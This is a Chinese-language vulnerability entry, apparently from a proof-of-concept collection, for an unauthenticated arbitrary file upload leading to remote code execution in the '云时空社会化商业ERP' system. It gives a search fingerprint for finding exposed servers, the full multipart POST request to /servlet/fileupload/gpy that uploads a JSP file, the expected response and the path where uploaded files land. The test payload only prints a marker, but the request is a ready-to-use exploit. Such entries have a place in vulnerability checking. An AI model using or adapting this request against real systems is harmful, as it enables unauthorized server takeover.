﻿# 云时空社会化商业ERP系统gpy任意文件上传漏洞RCE

> 更新时间：2023-12-11

> 漏洞编号：

> 漏洞说明：云时空社会化商业ERP以大型集团供应链系统为支撑，是基于互联网技术的多渠道模式营销服务管理体系，可以帮助您整合线上和线下交易模式，覆盖企业经营管理应用各个方面。云时空社会化商业ERP系统gpy接口存在任意文件上传漏洞，未经身份认证的攻击者可通过该漏洞在服务器端上传jsp文件获取服务器权限。文件路径：http://ip/uploads/pics/返回的日期/上传的文件名

> 漏洞特征：app="云时空社会化商业ERP系统"

> 验证脚本：HTTP

```
POST /servlet/fileupload/gpy HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388

--4eea98d02AEa93f60ea08dE3C18A1388
Content-Disposition: form-data; name="file1"; filename="dudesuite.jsp"
Content-Type: application/octet-stream

<% out.println("dudesuite"); %>
--4eea98d02AEa93f60ea08dE3C18A1388--
```

> 响应代码特征：200

> 响应内容特征：jspdate

> 上传文件定位：


> 验证文件来源：云时空社会化商业ERP系统gpy任意文件上传漏洞RCE.poc
